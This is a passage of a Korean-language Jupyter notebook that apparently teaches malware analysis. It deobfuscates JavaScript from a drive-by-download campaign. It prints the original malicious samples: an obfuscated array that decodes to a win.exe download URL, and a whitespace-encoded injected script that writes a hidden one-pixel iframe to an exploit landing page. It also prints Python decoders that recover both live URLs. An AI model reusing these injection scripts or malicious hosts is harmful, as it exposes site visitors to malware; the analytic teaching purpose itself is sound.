    "\t}else if( WhatIE.indexOf(\"nt 6\")>-1 && WhatIE.indexOf(\"msie 10\")>-1 ) {\n",
    "\t\tbu();\n",
    "\n",
    "\t}else if( WhatIE.indexOf(\"msie\")>-1 || WhatIE.indexOf(\"nt 5\")>-1 || WhatIE.indexOf(\"nt 6\")>-1 ) {\n",
    "\t\tfe();\n",
    "\n",
    "\t}\n",
    "</script>\n",
    "\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "nbpresent": {
     "id": "81822206-d833-4911-bcfe-19da9fc1c993"
    }
   },
   "source": [
    "위의 코드에서 확인해야할 부분은 바로 코드 최상단의 함수인 encode() 함수이다.\n",
    "\n",
    "```javascript\n",
    "1 function encode() {\n",
    "2     var omg = ckl(),\n",
    "3         x1 = new Array,\n",
    "4         x2 = '';\n",
    "5 \n",
    "6     for (var i = 0; i < omg.length; i++) {\n",
    "7         if (omg[i] == 159) {\n",
    "8             //x2 += '';\n",
    "9         } else {\n",
    "10             x1[i] = omg[i] - 159;\n",
    "11             x2 += String.fromCharCode(x1[i]);\n",
    "12         }\n",
    "13     }\n",
    "14     return x2;\n",
    "15 }\n",
    "```\n",
    "\n",
    "그리고 encode()에서 불러오는 \n",
    "\n",
    "ckl() 함수는 아래와 같다.\n",
    "\n",
    "```javascript\n",
    "1 function ckl() {\n",
    "2     var mini;\n",
    "3     mini = new Array(263, 275, 275, 271, 217, 206, 206, 259, 262, 271, 270, 259, 270, 278, 270, 269, 205, 258, 270, 205, 266, 273, 206, 256, 259, 268, 264, 269, 206, 268, 256, 264, 267, 206, 278, 264, 269, 205, 260, 279, 159, 260);\n",
    "4     return mini;\n",
    "5 }\n",
    "```\n",
    "\n",
    "encode() 함수의 기능을 요약하면,\n",
    "\n",
    "mini 배열에 저장된 변수의 크기만큼 반복하는 for loop이 있다.\n",
    "\n",
    "이 for loop은 mini 배열에 저장된 값에 접근한다.\n",
    "\n",
    "mini 배열 0번 째부터 반복하며 배열에 저장된 값이 159면 pass,\n",
    "\n",
    "값이 159이 아니면, 그 값에 -159를 빼고 x1 배열에 저장한다.\n",
    "\n",
    "그리고 x1에 저장한 값을 String.fromCharCode로 불러와 x2에 연이어 저장한다.\n",
    "\n",
    "해당 코드는 revelo 를 사용하면 손쉽게 풀 수 있다.\n",
    "\n",
    "![alt text](img/fig13.png)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "nbpresent": {
     "id": "c9e58d8a-f4f6-4472-9cb1-aedb38733d8c"
    }
   },
   "source": [
    "이 기능을 python으로 만들면 아래와 같다."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {
    "collapsed": false,
    "nbpresent": {
     "id": "94236124-2e09-49ef-8a56-868b15e61472"
    }
   },
   "outputs": [],
   "source": [
    "def ckurl(list):\n",
    "    result = []\n",
    "    for i in list:\n",
    "        if i is not 159:\n",
    "            result.append(chr(i-159))\n",
    "    return ''.join(result)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {
    "collapsed": false,
    "nbpresent": {
     "id": "da7227f1-6339-4e86-a136-11eb3d05201e"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "http://dgpodowon.co.kr/admin/mail/win.exe\n"
     ]
    }
   ],
   "source": [
    "input = [263, 275, 275, 271, 217, 206, 206, 259, 262, 271, 270, 259, 270, 278, 270, 269, 205, 258, 270, 205, 266, 273, 206, 256, 259, 268, 264, 269, 206, 268, 256, 264, 267, 206, 278, 264, 269, 205, 260, 279, 159, 260]\n",
    "\n",
    "print ckurl(input)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "nbpresent": {
     "id": "4dd77288-cf4c-4eb0-b8e3-c27cb0ececcb"
    }
   },
   "source": [
    "## Appendix. More Obfuscation"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "nbpresent": {
     "id": "646f7c1f-d6e6-4ecf-a484-7611e4e070ae"
    }
   },
   "source": [
    "아래와 같은 코드를 보면 무슨생각이 드나요?\n",
    "![alt text](img/fig14.png)\n",
    "![alt text](img/fig15.png)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "collapsed": true
   },
   "source": [
    "## Excercise\n",
    "\n",
    "* 목표: CK_VIP Drive by Download 캠페인에서 사용된 다른 javascript 난독화 기법을 해결해 본다.\n",
    "\n",
    "\n",
    "### Excercise files\n",
    "\n",
    "* appendix.hwf (httpwatcher)\n",
    "\n",
    "* appendix.pcapng (wireshark)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "삽입된 코드를 복사해서 붙여넣으면 아래와 같은 코드가 나온다\n",
    "\n",
    "위에만 보면 코드가 중간에 끊겨 있는것 처럼 보인다.\n",
    "```javascript\n",
    "<script type=\"text/javascript\">function RDfrepcStaticMenu5(s) {var r = new Array();var curr = 0;while(s.charAt(curr) != '\\n') {var tmp = 0;for (var i=6; i>=0 ; i-- ){if (s.charAt(curr) == ' '){tmp = tmp | (Math.pow(2,i));}curr++;}r.push(String.fromCharCode(tmp));}return r.join('');}if(document.cookie.indexOf(\"NAVERAD\")==-1 || document.cookie.indexOf(\"NAVERAD2 +\")==-1)Function(RDfrepcStaticMenu5(\"  \t\t \t\t  \t      \t\t\t     \t \t   \t  \t   \t\t \t   \t   \t   \t \t\t\t \t   \t   \t      \t\t \t  \t \t\t    \t \t\t  \t\t \t \t \t \t\t\t   \t \t   \t   \t  \t\t \t    \t\t    \t\t\t    \t\t\t\t    \t\t\t\t  \t\t \t \t \t \t\t\t\t \t\t\t \t\t \t\t \t \t  \t\t   \t\t\t\t    \t \t\t   \t\t  \t   \t\t \t  \t\t\t\t   \t  \t   \t\t \t \t \t\t \t \t  \t\t \t\t  \t\t\t\t   \t\t     \t\t \t  \t\t\t  \t \t\t \t \t  \t\t   \t\t\t \t\t\t \t\t \t \t  \t\t \t\t  \t\t \t  \t \t\t\t   \t \t\t   \t \t\t   \t\t\t\t\t \t\t \t \t  \t\t   \t\t\t\t\t \t \t\t \t \t  \t\t \t \t\t\t  \t\t \t\t \t \t  \t\t \t \t\t\t  \t  \t\t  \t  \t \t\t    \t \t\t   \t \t\t  \t \t\t   \t   \t  \t\t   \t \t\t \t \t  \t\t \t \t\t\t \t   \t\t\t\t    \t  \t  \t\t \t    \t\t     \t\t\t\t  \t       \t\t \t   \t \t\t   \t\t  \t \t\t \t \t  \t\t \t \t\t\t \t   \t\t\t    \t      \t  \t \t \t\t \t \t  \t\t \t \t\t\t  \t  \t\t\t\t   \t\t \t\t  \t  \t   \t \t\t   \t   \t\t \t\t \t \t  \t\t \t \t\t\t  \t \t \t\t\t\t  \t      \t  \t\t  \t  \t\t\t \t\t \t \t  \t\t \t \t\t\t  \t  \t\t\t    \t  \t\t  \t \t\t   \t\t\t    \t \t  \t  \t\t\t \t \t\t \t \t  \t\t \t \t\t\t  \t  \t\t\t\t    \t\t  \t  \t\t\t \t \t\t \t \t  \t\t \t \t\t\t \t    \t\t\t\t  \t \t\t\t   \t\t\t\t\t \t\t \t \t  \t\t \t\t  \t\t \t\t \t\t \t \t  \t\t \t\t  \t\t\t\t   \t     \t \t\t   \t\t \t\t   \t \t\t  \t \t\t\t\t \t\t \t \t  \t\t   \t\t\t \t\t\t \t\t \t \t  \t\t \t\t  \t\t \t\t  \t  \t\t  \t\t\t\t\t \t\t \t \t  \t\t \t\t  \t\t \t\t \t\t \t \t  \t\t \t\t  \t\t\t\t  \t \t\t\t  \t\t \t   \t \t\t   \t\t     \t \t\t\t   \t \t\t\t \t\t \t \t  \t\t   \t\t\t \t\t\t \t\t \t \t  \t\t \t\t  \t\t \t\t  \t\t\t \t \t\t \t \t  \t\t \t\t  \t\t \t\t \t\t \t \t  \t\t \t\t  \t\t\t\t  \t\t  \t   \t\t \t  \t\t\t\t   \t  \t   \t\t \t   \t\t\t \t  \t       \t\t \t  \t\t \t\t  \t\t \t    \t\t \t\t \t\t \t \t  \t\t   \t\t\t \t\t\t \t\t \t \t  \t\t \t\t  \t\t \t\t  \t\t\t\t\t \t\t \t \t  \t\t \t\t  \t\t \t\t \t\t \t \t  \t\t   \t\t\t \t \t \t\t \t \t  \t\t   \t\t\t\t  \t \t\t \t \t  \t\t \t \t\t\t  \t  \t \t\t   \t\t  \t   \t\t \t  \t\t\t\t   \t  \t   \t\t \t \t \t\t \t \t  \t\t   \t\t\t \t \t \t\t\t \t\t \t \t\t \t \t \t\t \t   \t  \\n\"))();var cookiename = document.cookie.indexOf(\"NAVERAD\") == -1 ? \"NAVERAD\" : \"NAVERAD2 +\";var expires=new Date();expires.setTime(expires.getTime()+24*60*60*1000);document.cookie=cookiename+\"=Yes;path=/;expires=\"+expires.toGMTString();</script>\n",
    "\n",
    "\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "notepad++을 이용하여 해당 코드를 보면 tab과 space가 많이 사용된 것으로 보인다.\n",
    "![alt text](img/fig16.png)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "tab과 space를 인자로 갖는 함수는 RDfrepcStaticMenu5 이다.\n",
    "\n",
    "```javascript\n",
    "function RDfrepcStaticMenu5(s) {\n",
    "    var r = new Array();\n",
    "    var curr = 0;\n",
    "    while (s.charAt(curr) != '\\n') {\n",
    "        var tmp = 0;\n",
    "        for (var i = 6; i >= 0; i--) {\n",
    "            if (s.charAt(curr) == ' ') {\n",
    "                tmp = tmp | (Math.pow(2, i));\n",
    "            }\n",
    "            curr++;\n",
    "        }\n",
    "        r.push(String.fromCharCode(tmp));\n",
    "    }\n",
    "    return r.join('');\n",
    "}\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "tmp i\n",
    "1 6\n",
    "2 5\n",
    "3 4\n",
    "4 3\n",
    "5 2\n",
    "6 1\n",
    "7 0\n",
    "\n",
    "8 6\n",
    "9 5\n",
    "10 4\n",
    "11 3\n",
    "12 2\n",
    "13 1\n",
    "14 0\n",
    "\n",
    "14 6\n",
    "15 5\n",
    "16 4\n",
    "17 3\n",
    "18 2\n",
    "19 1\n",
    "20 0\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "RDfrepcStaticMenu5 함수는\n",
    "\n",
    "전달받은 인자가 개행('\\n')이 올 때 까지 while 문으로 반복한다.\n",
    "\n",
    "그리고 내부에서 for 문으로 6개 공백(space, tab)을 반복하며,\n",
    "\n",
    "space가 있으면 i 번째 값을 2의 i 승을 하여 tmp에 그 값을 저장한다.\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 136,
   "metadata": {
    "collapsed": false,
    "scrolled": true
   },
   "outputs": [],
   "source": [
    "def white_space(cipher):\n",
    "    tmp = 0\n",
    "    result = []\n",
    "    for i,char in enumerate(cipher,1):\n",
    "        if char is not '\\n':\n",
    "            if char is ' ':\n",
    "                tmp = tmp | 2**(6-((i-1)%7))\n",
    "            if i is not 0:\n",
    "                if i%7 == 0:\n",
    "                    result.append(chr(tmp))\n",
    "                    tmp = 0           \n",
    "    return ''.join(result)\n",
    "    "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 137,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "cipher = \"  \t\t \t\t  \t      \t\t\t     \t \t   \t  \t   \t\t \t   \t   \t   \t \t\t\t \t   \t   \t      \t\t \t  \t \t\t    \t \t\t  \t\t \t \t \t \t\t\t   \t \t   \t   \t  \t\t \t    \t\t    \t\t\t    \t\t\t\t    \t\t\t\t  \t\t \t \t \t \t\t\t\t \t\t\t \t\t \t\t \t \t  \t\t   \t\t\t\t    \t \t\t   \t\t  \t   \t\t \t  \t\t\t\t   \t  \t   \t\t \t \t \t\t \t \t  \t\t \t\t  \t\t\t\t   \t\t     \t\t \t  \t\t\t  \t \t\t \t \t  \t\t   \t\t\t \t\t\t \t\t \t \t  \t\t \t\t  \t\t \t  \t \t\t\t   \t \t\t   \t \t\t   \t\t\t\t\t \t\t \t \t  \t\t   \t\t\t\t\t \t \t\t \t \t  \t\t \t \t\t\t  \t\t \t\t \t \t  \t\t \t \t\t\t  \t  \t\t  \t  \t \t\t    \t \t\t   \t \t\t  \t \t\t   \t   \t  \t\t   \t \t\t \t \t  \t\t \t \t\t\t \t   \t\t\t\t    \t  \t  \t\t \t    \t\t     \t\t\t\t  \t       \t\t \t   \t \t\t   \t\t  \t \t\t \t \t  \t\t \t \t\t\t \t   \t\t\t    \t      \t  \t \t \t\t \t \t  \t\t \t \t\t\t  \t  \t\t\t\t   \t\t \t\t  \t  \t   \t \t\t   \t   \t\t \t\t \t \t  \t\t \t \t\t\t  \t \t \t\t\t\t  \t      \t  \t\t  \t  \t\t\t \t\t \t \t  \t\t \t \t\t\t  \t  \t\t\t    \t  \t\t  \t \t\t   \t\t\t    \t \t  \t  \t\t\t \t \t\t \t \t  \t\t \t \t\t\t  \t  \t\t\t\t    \t\t  \t  \t\t\t \t \t\t \t \t  \t\t \t \t\t\t \t    \t\t\t\t  \t \t\t\t   \t\t\t\t\t \t\t \t \t  \t\t \t\t  \t\t \t\t \t\t \t \t  \t\t \t\t  \t\t\t\t   \t     \t \t\t   \t\t \t\t   \t \t\t  \t \t\t\t\t \t\t \t \t  \t\t   \t\t\t \t\t\t \t\t \t \t  \t\t \t\t  \t\t \t\t  \t  \t\t  \t\t\t\t\t \t\t \t \t  \t\t \t\t  \t\t \t\t \t\t \t \t  \t\t \t\t  \t\t\t\t  \t \t\t\t  \t\t \t   \t \t\t   \t\t     \t \t\t\t   \t \t\t\t \t\t \t \t  \t\t   \t\t\t \t\t\t \t\t \t \t  \t\t \t\t  \t\t \t\t  \t\t\t \t \t\t \t \t  \t\t \t\t  \t\t \t\t \t\t \t \t  \t\t \t\t  \t\t\t\t  \t\t  \t   \t\t \t  \t\t\t\t   \t  \t   \t\t \t   \t\t\t \t  \t       \t\t \t  \t\t \t\t  \t\t \t    \t\t \t\t \t\t \t \t  \t\t   \t\t\t \t\t\t \t\t \t \t  \t\t \t\t  \t\t \t\t  \t\t\t\t\t \t\t \t \t  \t\t \t\t  \t\t \t\t \t\t \t \t  \t\t   \t\t\t \t \t \t\t \t \t  \t\t   \t\t\t\t  \t \t\t \t \t  \t\t \t \t\t\t  \t  \t \t\t   \t\t  \t   \t\t \t  \t\t\t\t   \t  \t   \t\t \t \t \t\t \t \t  \t\t   \t\t\t \t \t \t\t\t \t\t \t \t\t \t \t \t\t \t   \t  \\n\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 138,
   "metadata": {
    "collapsed": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "document.write(unescape(\"%3Ciframe%20src%3D%22http%3A%2F%2Ffitting%2Eavesports%2Ecom%2Fadmin%2FPoll%2Fclick1%2Fas1%2Ephp%22%20width%3D%2260%22%20height%3D%221%22%20frameborder%3D%220%22%3E%3C%2Fiframe%3E\"));\n"
     ]
    }
   ],
   "source": [
    "print(white_space(cipher))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 147,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "encoded_url = white_space(cipher)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 149,
   "metadata": {
    "collapsed": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "document.write(unescape(\"<iframe src=\"http://fitting.avesports.com/admin/Poll/click1/as1.php\" width=\"60\" height=\"1\" frameborder=\"0\"></iframe>\"));\n"
     ]
    }
   ],
   "source": [
    "import urllib\n",
    "print urllib.unquote(encoded_url)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "anaconda-cloud": {},
  "kernelspec": {
   "display_name": "Python [conda root]",
   "language": "python",
   "name": "conda-root-py"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 2
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython2",
   "version": "2.7.12"
  },
  "nbpresent": {
   "slides": {
    "007d9323-81bd-4684-81f3-cccc1e42a24c": {
     "id": "007d9323-81bd-4684-81f3-cccc1e42a24c",
     "prev": "ffceddff-00da-423c-b8d3-50f3c43fd766",
     "regions": {
      "869af88e-0b3c-4918-8220-b747e21c0baf": {
       "attrs": {
        "height": 0.8,
        "width": 0.8,
        "x": 0.1,
        "y": 0.1
       },
       "content": {
        "cell": "81822206-d833-4911-bcfe-19da9fc1c993",
        "part": "whole"
       },
       "id": "869af88e-0b3c-4918-8220-b747e21c0baf"
      }
     }
    },
    "015bd311-c4b1-4857-b3b7-d5678c382f9d": {
     "id": "015bd311-c4b1-4857-b3b7-d5678c382f9d",
     "prev": "b07fbe9c-b9d1-4037-b045-e10743bbe391",
     "regions": {
      "2fea4efd-3497-45df-aa94-0a9cfd1f7027": {
       "attrs": {
        "height": 0.8,
        "width": 0.8,
        "x": 0.1,
        "y": 0.1
       },
       "content": {
        "cell": "174c1289-3cb7-4a55-80e0-4a897694a57d",
        "part": "whole"
       },
       "id": "2fea4efd-3497-45df-aa94-0a9cfd1f7027"
      }
     }
    },
    "17d393c3-d6bd-4006-8612-cf6d33d727f4": {
     "id": "17d393c3-d6bd-4006-8612-cf6d33d727f4",
     "prev": "5c33090d-0f35-4583-803e-e4fc73d68cb5",
     "regions": {
      "bbeef59b-76c4-4590-ae96-8f516c6fe7ba": {
       "attrs": {
        "height": 0.8,
        "width": 0.8,
        "x": 0.1,
        "y": 0.1
       },
       "content": {
        "cell": "da7227f1-6339-4e86-a136-11eb3d05201e",
        "part": "whole"
       },
       "id": "bbeef59b-76c4-4590-ae96-8f516c6fe7ba"
      }
     }
    },
    "20aa9b50-0009-4e45-98e1-a4ec56493acb": {
     "id": "20aa9b50-0009-4e45-98e1-a4ec56493acb",
     "prev": "007d9323-81bd-4684-81f3-cccc1e42a24c",
     "regions": {
      "21299466-06d8-4663-baa6-105d263a5a1c": {
       "attrs": {
        "height": 0.8,
        "width": 0.8,
        "x": 0.1,
        "y": 0.1
       },
       "content": {
        "cell": "c9e58d8a-f4f6-4472-9cb1-aedb38733d8c",
        "part": "whole"
       },
       "id": "21299466-06d8-4663-baa6-105d263a5a1c"
      }
     }
    },
    "22e56919-c468-49a6-acca-4bf6a50bf6ac": {
     "id": "22e56919-c468-49a6-acca-4bf6a50bf6ac",
     "prev": "93288456-76a1-47a0-bbd9-d88dc1bcc715",
     "regions": {
      "2bc2db4b-43b6-49c8-aa7a-3031cbc15280": {
       "attrs": {
        "height": 0.8,
        "width": 0.8,
        "x": 0.1,
        "y": 0.1
       },
       "content": {
        "cell": "6f4defb7-1308-4513-b69c-05edfd2863b2",
        "part": "whole"
       },
       "id": "2bc2db4b-43b6-49c8-aa7a-3031cbc15280"
      }
     }
    },
    "2621969f-e693-4441-84f6-3115f5518415": {
     "id": "2621969f-e693-4441-84f6-3115f5518415",
     "prev": "d7fdfd45-e654-49ea-a656-7da24f08f99f",
     "regions": {
      "4f0f38f4-5af7-4803-9119-284edf2a4b0e": {
       "attrs": {
        "height": 0.8,
        "width": 0.8,
        "x": 0.1,
        "y": 0.1
       },
       "content": {
        "cell": "14046f6c-ea53-42d1-ab75-eb6ced7c6343",
        "part": "whole"
       },
       "id": "4f0f38f4-5af7-4803-9119-284edf2a4b0e"
      }
     }
    },
    "278841ca-dfb3-4ae2-84cc-826b72764904": {
     "id": "278841ca-dfb3-4ae2-84cc-826b72764904",
     "prev": "daf49c9e-5c61-4f0b-aa3b-f987c3acfef5",
     "regions": {
      "915abbb9-88e5-4b5e-8a40-61bcb9b58c44": {
       "attrs": {
        "height": 0.8,
        "width": 0.8,
        "x": 0.1,
        "y": 0.1
       },
       "content": {
        "cell": "e7174d98-1a5f-4c33-b0a7-0ea31529254e",
        "part": "whole"
       },
       "id": "915abbb9-88e5-4b5e-8a40-61bcb9b58c44"
      }
     }
    },
    "49b16a25-a1d1-4962-a0b8-c9550241d548": {
     "id": "49b16a25-a1d1-4962-a0b8-c9550241d548",
     "prev": "af466459-e5ec-4a1f-ba45-406ff44d8962",
     "regions": {
      "4756d870-e039-4bbd-9d2c-43fc493394da": {
       "attrs": {
        "height": 0.8,
        "width": 0.8,
        "x": 0.1,
        "y": 0.1
       },
       "content": {
        "cell": "646f7c1f-d6e6-4ecf-a484-7611e4e070ae",
        "part": "whole"
       },
       "id": "4756d870-e039-4bbd-9d2c-43fc493394da"
      }
     }
    },
    "4da0aa2e-73af-43e0-bc88-2e86a44d186c": {
     "id": "4da0aa2e-73af-43e0-bc88-2e86a44d186c",
     "prev": "015bd311-c4b1-4857-b3b7-d5678c382f9d",
     "regions": {
      "a6d93341-5116-4349-ae72-20fccdf2050e": {
       "attrs": {
        "height": 0.8,
        "width": 0.8,
        "x": 0.1,
        "y": 0.1
       },
       "content": {
        "cell": "018df919-082d-4ed2-b9bc-f1841e449fb5",
        "part": "whole"
       },
       "id": "a6d93341-5116-4349-ae72-20fccdf2050e"
      }
     }
    },
    "516af027-fcda-4af2-8154-a854b2b3c8ad": {
     "id": "516af027-fcda-4af2-8154-a854b2b3c8ad",
     "prev": "278841ca-dfb3-4ae2-84cc-826b72764904",
     "regions": {
      "6acfc2f5-b259-4218-9f32-b4213b329c53": {
       "attrs": {
        "height": 0.8,
        "width": 0.8,
        "x": 0.1,
        "y": 0.1
       },
       "content": {
        "cell": "e3108e5b-0f58-42ce-b6ad-b75475de2226",
        "part": "whole"
       },
       "id": "6acfc2f5-b259-4218-9f32-b4213b329c53"
      }
     }
    },
    "5406e1f2-4939-43fc-bc12-cbec8f7da843": {
     "id": "5406e1f2-4939-43fc-bc12-cbec8f7da843",
     "prev": "49b16a25-a1d1-4962-a0b8-c9550241d548",
     "regions": {
      "3686da7f-2cfa-49f3-ac05-4c6719a21e52": {
       "attrs": {
        "height": 0.8,
        "width": 0.8,
        "x": 0.1,
        "y": 0.1
       },
       "content": {
        "cell": "cceb5461-05fc-469a-a41f-2cd809f48a4c",
        "part": "whole"
       },
       "id": "3686da7f-2cfa-49f3-ac05-4c6719a21e52"
      }
     }
    },
    "5c33090d-0f35-4583-803e-e4fc73d68cb5": {
     "id": "5c33090d-0f35-4583-803e-e4fc73d68cb5",
     "prev": "20aa9b50-0009-4e45-98e1-a4ec56493acb",
     "regions": {
      "c9f547b9-6411-4b3d-a9bd-a79866c3674b": {
       "attrs": {
        "height": 0.8,
        "width": 0.8,
        "x": 0.1,
        "y": 0.1
       },
       "content": {
        "cell": "94236124-2e09-49ef-8a56-868b15e61472",
        "part": "whole"
       },
       "id": "c9f547b9-6411-4b3d-a9bd-a79866c3674b"
      }
     }
    },
    "6e0d2c5d-87ec-49ad-914e-cc37a0b911e2": {
     "id": "6e0d2c5d-87ec-49ad-914e-cc37a0b911e2",
     "prev": "76596aca-6c59-4d3d-a2a2-5562148b0db5",
     "regions": {
      "1a215019-8f93-446c-9683-1903e1bea9ff": {
       "attrs": {
        "height": 0.8,
        "width": 0.8,
        "x": 0.1,
        "y": 0.1
       },
       "content": {
        "cell": "12dbba91-dab2-46c0-b654-817f04d0cef7",
        "part": "whole"
       },
       "id": "1a215019-8f93-446c-9683-1903e1bea9ff"
      }
     }
    },
    "76596aca-6c59-4d3d-a2a2-5562148b0db5": {
     "id": "76596aca-6c59-4d3d-a2a2-5562148b0db5",
     "prev": "eb09eb19-376c-423a-92e5-8b80f0c0b08b",
     "regions": {
      "cad21cc2-39ed-4931-b027-28ed0404982f": {
       "attrs": {
        "height": 0.8,
        "width": 0.8,
        "x": 0.1,
        "y": 0.1
       },
       "content": {
        "cell": "fd6633a8-c041-42f7-943e-62d0931b1a5d",
        "part": "whole"
       },
       "id": "cad21cc2-39ed-4931-b027-28ed0404982f"
      }
     }
    },
    "7c50d527-ff01-406a-825f-809113d4f72f": {
     "id": "7c50d527-ff01-406a-825f-809113d4f72f",
     "prev": "86d421de-8192-4642-9e2f-9ad184ca8de5",
     "regions": {
      "bf505a62-353a-464d-bccf-28dbcf177f71": {
       "attrs": {
        "height": 0.8,
        "width": 0.8,
        "x": 0.1,
        "y": 0.1
       },
       "content": {
        "cell": "cc7decfd-4e70-4a69-9838-9f07497a094c",
        "part": "whole"
       },
       "id": "bf505a62-353a-464d-bccf-28dbcf177f71"
      }
     }
    },
    "7f7e24e0-146b-4ac1-b996-af0210508778": {
     "id": "7f7e24e0-146b-4ac1-b996-af0210508778",
     "prev": "eaca8578-9800-411d-b8d4-d6fa4d3dc100",
     "regions": {
      "f8374666-dd4a-417d-8ff3-32388eec684d": {
       "attrs": {
        "height": 0.8,
        "width": 0.8,
        "x": 0.1,
        "y": 0.1
       },
       "content": {
        "cell": "1f33528f-b649-4175-a361-7513fcdd7c71",
        "part": "whole"
       },
       "id": "f8374666-dd4a-417d-8ff3-32388eec684d"
      }
     }
    },
    "86d421de-8192-4642-9e2f-9ad184ca8de5": {
     "id": "86d421de-8192-4642-9e2f-9ad184ca8de5",
     "prev": "ff52c62f-304a-4cdc-9f5d-b087afeed87b",
     "regions": {
      "1bdffd45-ffb6-4c20-b473-58a67912ab5b": {
       "attrs": {
        "height": 0.8,
        "width": 0.8,
        "x": 0.1,
        "y": 0.1
       },
       "content": {
        "cell": "e569a94d-eba4-4916-96ae-e480b887dc3d",
        "part": "whole"
       },
       "id": "1bdffd45-ffb6-4c20-b473-58a67912ab5b"
      }
     }
    },
    "93288456-76a1-47a0-bbd9-d88dc1bcc715": {
     "id": "93288456-76a1-47a0-bbd9-d88dc1bcc715",
     "prev": "7c50d527-ff01-406a-825f-809113d4f72f",
     "regions": {
      "90e99e0e-ce9f-4d60-ac7a-af56dba5b578": {
       "attrs": {
        "height": 0.8,
        "width": 0.8,
        "x": 0.1,
        "y": 0.1
       },
       "content": {
        "cell": "4ef59f25-446b-415d-8616-69b10ba3b074",
        "part": "whole"
       },
       "id": "90e99e0e-ce9f-4d60-ac7a-af56dba5b578"
      }
     }
    },
    "a3fa831a-7713-4508-85f9-a7bd69c563f2": {
     "id": "a3fa831a-7713-4508-85f9-a7bd69c563f2",
     "prev": "f34d073c-671d-4789-a684-2b1f89662af8",
     "regions": {
      "b8d6a1f9-cfed-450f-98f1-b6d4f577ec29": {
       "attrs": {
        "height": 0.8,
        "width": 0.8,
        "x": 0.1,
        "y": 0.1
       },
       "content": {
        "cell": "25e50669-9200-4d8a-9cd5-8e618e4b6f28",
        "part": "whole"
       },
       "id": "b8d6a1f9-cfed-450f-98f1-b6d4f577ec29"
      }
     }
    },
    "af44c245-150e-4d48-b2d5-e760610e7eef": {
     "id": "af44c245-150e-4d48-b2d5-e760610e7eef",
     "prev": "e4f3eff3-5135-4492-930d-7cb772a71bf3",
     "regions": {
      "d65443bf-dc8c-4731-b16f-2d22ae004ea5": {
       "attrs": {
        "height": 0.8,
        "width": 0.8,
        "x": 0.1,
        "y": 0.1
       },
       "content": {
        "cell": "aaffba45-d47d-4083-9ad1-d2b5f943eceb",
        "part": "whole"
       },
       "id": "d65443bf-dc8c-4731-b16f-2d22ae004ea5"
      }
     }
    },
    "af466459-e5ec-4a1f-ba45-406ff44d8962": {
     "id": "af466459-e5ec-4a1f-ba45-406ff44d8962",
     "prev": "17d393c3-d6bd-4006-8612-cf6d33d727f4",
     "regions": {
      "f468b1fc-38ea-4a87-b470-e634042edd74": {
       "attrs": {
        "height": 0.8,
        "width": 0.8,
        "x": 0.1,
        "y": 0.1
       },
       "content": {
        "cell": "4dd77288-cf4c-4eb0-b8e3-c27cb0ececcb",
        "part": "whole"
       },
       "id": "f468b1fc-38ea-4a87-b470-e634042edd74"
      }
     }
    },
    "b07fbe9c-b9d1-4037-b045-e10743bbe391": {
     "id": "b07fbe9c-b9d1-4037-b045-e10743bbe391",
     "prev": "516af027-fcda-4af2-8154-a854b2b3c8ad",
     "regions": {
      "a0fbd4a6-3665-4400-a31c-cfebf657afda": {
       "attrs": {
        "height": 0.8,
        "width": 0.8,
        "x": 0.1,
        "y": 0.1
       },
       "content": {
        "cell": "a20770bf-e34d-4395-ab41-f0e6df92f0d0",
        "part": "whole"
       },
       "id": "a0fbd4a6-3665-4400-a31c-cfebf657afda"
      }
     }
    },
    "b150822a-ed59-4313-920a-96bf7295caad": {
     "id": "b150822a-ed59-4313-920a-96bf7295caad",
     "prev": null,
     "regions": {
      "76c8f927-c55a-4a6b-a233-4978fc0140b3": {
       "attrs": {
        "height": 0.8,
        "width": 0.8,
        "x": 0.1,
        "y": 0.1
       },
       "content": {
        "cell": "b4a638cf-4cda-49d3-8858-1e7f7c656bf4",
        "part": "whole"
       },
       "id": "76c8f927-c55a-4a6b-a233-4978fc0140b3"
      }
     }
    },
    "d7fdfd45-e654-49ea-a656-7da24f08f99f": {
     "id": "d7fdfd45-e654-49ea-a656-7da24f08f99f",
     "prev": "a3fa831a-7713-4508-85f9-a7bd69c563f2",
     "regions": {
      "97a6321f-b3ed-46fe-8861-7aec1e3766b4": {
       "attrs": {
        "height": 0.8,
        "width": 0.8,
        "x": 0.1,
        "y": 0.1
       },
       "content": {
        "cell": "e2971bd0-ea4c-406e-9576-303b2743ebf5",
        "part": "whole"
       },
       "id": "97a6321f-b3ed-46fe-8861-7aec1e3766b4"
      }
     }
    },
    "d9e8a525-5264-4f49-9229-43f41f148a99": {
     "id": "d9e8a525-5264-4f49-9229-43f41f148a99",
     "prev": "b150822a-ed59-4313-920a-96bf7295caad",
     "regions": {
      "75b691ba-a479-4fe9-912b-04e1c0c7c0ee": {
       "attrs": {
        "height": 0.8,
